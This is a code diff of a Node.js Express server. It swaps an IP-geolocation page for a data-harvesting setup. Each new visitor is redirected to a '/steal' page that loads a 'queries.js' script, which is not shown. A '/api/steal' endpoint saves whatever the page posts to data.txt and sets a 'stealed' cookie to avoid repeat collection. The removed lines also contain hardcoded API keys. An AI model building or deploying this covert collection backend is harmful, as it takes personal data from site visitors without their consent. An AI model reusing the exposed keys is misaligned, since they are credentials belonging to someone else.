@@ -1,43 +1,52 @@
-const { IPinfoWrapper } = require("node-ipinfo");
-const playwright = require("playwright");
-
-let si = require("systeminformation"),
-    app = require("express")(),
-    port = process.env.PORT || 3000;
-
+const si = require("systeminformation"),
+    express = require("express"),
+    app = express(),
+    port = process.env.PORT || 3000,
+    bodyParser = require("body-parser"),
+    cookieParser = require("cookie-parser"),
+    fs = require("fs");
 function removeEmpty(obj) {
     return Object.fromEntries(Object.entries(obj).filter(([_, v]) => v != null));
 }
-const IP = require("ip");
-app.get("/", async (req, res) => {
-    res.send(`<pre style="white-space: pre-wrap;">${JSON.stringify(await getIp(),undefined,2)}</pre>`);
+
+app.use(express.static("public"));
+app.set("view engine", "pug");
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+app.use(cookieParser());
+
+app.get("/steal", async (req, res) => {
+    if (!req.cookies.stealed) {
+        res.locals.files = ["queries.js"];
+        res.render("index", { title: "Hey", message: "Hello there!"});
+    } else {
+        res.redirect("/");
+    }
 });
-
-async function getIp() {
-    let browser = await playwright["chromium"].launch({
-        headless: false,
-        channel: "chrome",
+app.get("/", async (req, res) => {
+    if (!req.cookies.stealed) {
+        res.redirect("/steal");
+    } else {
+        res.locals.files = [];
+        res.render("index", { title: "Hey", message: "Stealed" });
+    }
+});
+app.get("/index", async (req,res) => {
+    res.redirect("/")
+})
+app.post("/api/steal", async (req, res) => {
+    res.cookie("stealed", 1, { maxAge: 15000000, httpOnly: true });
+    fs.writeFile("data.txt", JSON.stringify(req.body) + "\n", function (err, data) {
+        if (err) {
+            console.log(err);
+        }
+        if (data) {
+            console.log("true");
+        }
     });
-    let context = await browser.newContext();
-    let page = await context.newPage();
-    let respondIp = await page.evaluate(async () => {
-        let dataip;
-        await fetch("https://ipinfo.io?token=4b8af40cd4f57e").then(async (e) => {
-            await e.json().then(async (e) => {
-                await fetch(`http://api.positionstack.com/v1/reverse?access_key=e9bc72f138759ef21d8de8227f545f6c&query=${e.loc}&limit=20`)
-                    .then(async (e) => await e.json())
-                    .then((p) => {
-                        dataip = e;
-                        dataip.ips = p;
-                    });
-            });
-        });
-
-        return dataip;
-    });
-    await browser.close();
-    return respondIp;
-}
+    // res.redirect("/");
+    res.json({saved:true});
+});
 
 app.listen(port, () => {
     console.log(`listening on port ${port}`);
